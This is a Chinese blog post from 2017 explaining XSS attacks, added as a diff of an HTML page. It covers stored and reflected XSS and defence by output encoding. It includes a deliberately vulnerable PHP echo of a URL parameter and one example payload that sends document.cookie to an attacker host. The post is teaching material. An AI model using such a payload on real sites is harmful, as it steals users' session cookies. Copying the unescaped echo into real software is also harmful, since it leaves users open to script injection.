@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <base target="_blank" />
+  
+  <meta name="description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收到的网页中，以完成某种不利于用户的操作。" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>XSS 攻击原理 | 南潮的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收到的网页中，以完成某种不利于用户的操作。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS 攻击原理">
+<meta property="og:url" content="http://nanchao.win/2017/04/05/XSS/index.html">
+<meta property="og:site_name" content="Enjoy javascript">
+<meta property="og:description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收到的网页中，以完成某种不利于用户的操作。">
+<meta property="og:updated_time" content="2017-04-10T11:54:14.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS 攻击原理">
+<meta name="twitter:description" content="XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收到的网页中，以完成某种不利于用户的操作。">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+    
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <script src='/js/nprogress.js'></script>
+  <link rel='stylesheet' href='/css/nprogress.css'/>
+
+  <link rel="stylesheet" href="/css/prettify.css" type="text/css">
+  <script src="/js/prettify.js" type="text/javascript"></script>
+
+  <!-- baidu webmaster push -->
+  <!--<script src='//push.zhanzhang.baidu.com/push.js'></script>-->
+    
+</head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      
+
+<header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="Enjoy javascript" rel="home">Enjoy javascript</a>
+      </h1>
+      
+        <h2 class="site-description">
+          <a href="/" id="subtitle">为者常成，行者常至</a>
+        </h2>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/demo">Demo</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+
+
+<script>
+    // Show the progress bar 
+    NProgress.start();
+
+    // Increase randomly
+    var interval = setInterval(function() { NProgress.inc(); }, 1000);        
+
+    // Trigger finish when page fully loaded
+    jQuery(window).load(function () {
+        clearInterval(interval);
+        NProgress.done();
+    });
+
+    // Trigger bar when exiting the page
+    jQuery(window).unload(function () {
+        NProgress.start();
+    });
+
+</script>
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-XSS" class="post-XSS post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      XSS 攻击原理
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="/2017/04/05/XSS/#comments" class="leave-reply">Reply</a>
+            
+            <a href="javascript:void(0);" data-url="http://nanchao.win/2017/04/05/XSS/" data-id="cj2px24rr0004f50b0ug23z7y" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    
+
+    <div class="entry-content">
+      
+        <p>XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样式表（Cascading Style Sheet）的缩写 CSS，一般将其缩写为 XSS。XSS 针对一种 web 安全漏洞，该漏洞允许攻击者将恶意脚本注入到用户接收到的网页中，以完成某种不利于用户的操作。</p>
+<a id="more"></a>
+<p>简单地说，攻击者可以利用 XSS 漏洞向用户发送攻击脚本，因为用户的浏览器并不知道这段脚本是恶意的，所以依然会执行它。这段恶意脚本可以像正常脚本一样访问 cookie、读取保存在浏览器里的敏感信息，甚至还可以改写页面，进行钓鱼攻击。</p>
+<p>下面两个例子，会让我们对 XSS 有个直观的认识。</p>
+<p><strong>场景一：</strong></p>
+<p>攻击者在某网站评论页面，提交了一段可执行的 JavaScript 脚本（这里假设为“恶意脚本”），若服务器端接收到这段脚本后，没有进行过滤或者转义这段脚本，而是将其作为普通的内容发布到了用户评论区，那么，后续用户访问到这个页面后，就会执行这段注入的“恶意脚本”。</p>
+<p><strong>场景二：</strong></p>
+<p>网站 www.a.com 会根据 url 后参数 content 来呈现不同的内容，我们假设页面 index.php 代码如下：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;接收的内容：&lt;/h1&gt;
+
+&lt;?php
+    echo $_GET[&#39;content&#39;];
+?&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>当我们访问地址 <a href="http://www.a.com/index.php?content=test" target="_blank" rel="external">http://www.a.com/index.php?content=test</a> 时，页面输出内容就是 test。这样好像并没有什么问题，但是，如果攻击者将访问地址修改为 <a href="http://www.a.com/index.php?content=&lt;script&gt;window.open(&quot;www.b.com?param=&quot;+document.cookie)&lt;/script&gt;，" target="_blank" rel="external">http://www.a.com/index.php?content=&lt;script&gt;window.open(&quot;www.b.com?param=&quot;+document.cookie)&lt;/script&gt;，</a> 问题就来了。当某人打开这个地址后，除了打开 www.a.com ,还会弹出一个新的窗口 www.b.com（攻击者的站点），并且带上他保存在本地的 cookie，这些 cookie 很可能包含了他的用户名、密码等私密信息，而这些信息都会被攻击者获取。</p>
+<p>（当然了，安装上面步骤操作一遍，我们不一定能看到上面所说的现象，那是因为有些浏览器会自带一些保护性措施来防止这种 XSS 攻击）</p>
+<p>XSS 攻击大体分为以上两类：</p>
+<p><strong>① 存储式攻击</strong><br>主要出现在让用户输入数据，然后存入数据库的场景，比如留言、评论、博客日志和各类表单等。攻击者在这类页面输入恶意脚本后，若未经过滤直接入库，应用程序从数据库中读取这些“恶意脚本数据”，并在页面中发布出来，后续用户浏览此页面时就可能受到攻击。</p>
+<p><strong>② 反射型攻击</strong><br>攻击者将恶意脚本代码加入 url 地址的请求参数里，应用程序接收到请求参数后，将参数直接输入，就可能引入可执行的代码块。用户点击类似的恶意链接就可能执行此代码块，受到攻击。</p>
+<p><strong>归根结底，以上两类情况都是没有对用户提交的数据（参数）做过滤检查。所以，开发者应该有一个共识：永远不要相信用户的输入！对用户的输入进行过滤和审核是一个必要的环节！</strong></p>
+<p>依据以上分析，我们知道：<strong>预防 XSS 攻击的核心就是在输出不可信数据的时候进行编码，过滤特殊字符。</strong></p>
+<pre><code>&lt;     -&gt;  &amp;lt;    
+&gt;     -&gt;  &amp;gt;
+&amp;     -&gt;  &amp;amp;
+&quot;     -&gt;  &amp;quot; 
+&quot;     -&gt;  &amp;#x27;
+空格  -&gt;  &amp;nbsp;  
+/     -&gt;  &amp;#x2f;
+</code></pre><p>以上编码转换能够防御一部分 XSS 攻击。实际生产过程中，具体问题还是应该具体分析。</p>
+<p>参考：<br>[1] <a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md" target="_blank" rel="external">https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md</a><br>[2] <a href="http://blog.csdn.net/ghsau/article/details/17027893" target="_blank" rel="external">http://blog.csdn.net/ghsau/article/details/17027893</a><br>[3] <a href="http://www.freebuf.com/articles/web/9977.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/9977.html</a></p>
+
+      
+    </div><!-- .entry-content -->
+
+
+    <footer class="entry-meta">
+    <a href="/2017/04/05/XSS/">
+    <time datetime="2017-04-05T06:12:50.000Z" class="entry-date">
+        2017-04-05
+    </time>
+</a>
+    
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/problem/">problem</a></li></ul>
+
+    </footer>
+</article>
+
+
+
+
+    <p>
+    <span id="busuanzi_container_page_pv">
+      <span id="busuanzi_value_page_pv"></span> views
+    </span>
+</p>
+</br>
+
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+        <p><span class="nav-previous"><a href="/2017/04/06/CSRF/" rel="prev"><span class="meta-nav">上一篇：</span>CSRF 攻击原理</a></span></p>
+    
+    
+        <p><span class="nav-next"><a href="/2017/04/05/localStorage01/" rel="next"><span class="meta-nav">下一篇：</span>浏览器本地存储（二） </a></span></p>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+<section id="comments">
+  <!--网易云跟帖 开始-->
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+  <script>
+  var cloudTieConfig = {
+    url: document.location.href, 
+    sourceId: "",
+    productKey: "5a032688db1348678f3949687092d2c3",
+    target: "cloud-tie-wrapper"
+  };
+  </script>
+  <script src="https://img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
+  <!--网易云跟帖 结束-->
+</section>
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2017/05/12/observer/">JavaScript 观察者模式</a>
+          </li>
+        
+          <li>
+            <a href="/2017/05/04/singleton/">JavaScript 单例模式</a>
+          </li>
+        
+          <li>
+            <a href="/2017/05/02/ready/">ready 方法的实现</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/21/call-apply-bind/">理解 call + bind</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/14/some-javascript-functions/">几个典型的 JavaScript 函数</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/07/variable/">JavaScript 变量</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/07/data-type/">JavaScript 数据类型</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/06/CSRF/">CSRF 攻击原理</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/05/XSS/">XSS 攻击原理</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/05/localStorage01/">浏览器本地存储（二）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-content">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/algorithm/">algorithm</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/grammar/">grammar</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/">js</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/method/">method</a><span class="tag-list-count">12</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem/">problem</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/">tools</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-content tagcloud">
+      <a href="/tags/algorithm/" style="font-size: 10px;">algorithm</a> <a href="/tags/css/" style="font-size: 10px;">css</a> <a href="/tags/grammar/" style="font-size: 12.5px;">grammar</a> <a href="/tags/js/" style="font-size: 17.5px;">js</a> <a href="/tags/method/" style="font-size: 20px;">method</a> <a href="/tags/problem/" style="font-size: 15px;">problem</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </aside>
+
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2017 <a href="https://github.com/jserNc/" target="_blank">nanc</a>
+    All rights reserved. Powered by 
+        <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </p>
+    <p>
+        <span id="busuanzi_container_site_uv">
+            你是本站第<span id="busuanzi_value_site_uv"></span>位访客，欢迎你！
+        </span>
+    </p>
+</footer>
+    
+
+<script>
+$(window).load(function(){
+ $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   prettyPrint();
+ })
+</script>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/jquery.goup.min.js"></script>
+<script>
+$(document).ready(function () {  
+    $.goup({  
+        trigger: 100,  
+        bottomOffset: 62,       //距底部偏移量   
+        locationOffset: 150,     //距右部偏移量  
+        title: '返回顶部',  
+        titleAsText: true       //是否显示title  
+    });  
+}); 
+</script>
+
+
+<!--<script src="/js/navigation.js"></script>-->
+
+<div id="bg"></div>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+
+
+
+
+  </div>
+</body>
+</html>
